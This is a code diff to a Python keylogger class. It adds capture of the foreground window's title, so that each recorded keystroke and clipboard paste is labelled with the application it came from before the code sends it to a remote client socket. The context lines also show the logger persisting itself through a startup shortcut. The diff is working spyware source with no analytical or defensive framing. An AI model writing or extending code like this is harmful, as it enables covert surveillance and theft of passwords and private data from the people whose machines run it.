@@ -9,6 +9,7 @@ import threading
 import pyperclip
 from client import ClientSocket
 import socket
+import win32gui
 
 class KeyLogger:
     def __init__(self):
@@ -34,17 +35,23 @@ class KeyLogger:
         if not self.check_startup():
             self.create_shortcut()
 
+    def get_active_window(self):
+        w = win32gui
+        activeWindow = w.GetWindowText(w.GetForegroundWindow())
+        return str(activeWindow)
+
 
     def on_press(self, key):
         time = datetime.now().replace(microsecond=0)
         paste = pyperclip.paste()
+        window = self.get_active_window()
 
         if key == keyboard.Key.ctrl_l:
             if paste != self.oldPaste:
                 self.oldPaste = paste
-                self.client.send_message(f"{time} | Paste - {paste}\n")
+                self.client.send_message(f"{time} | {window} | Paste - {paste}\n")
         else:
-            self.client.send_message(f"{time} | Key - {key}\n")
+            self.client.send_message(f"{time} | {window} | Key - {key}\n")
 
     def key_listener(self):
         with keyboard.Listener(on_press=self.on_press) as kl:
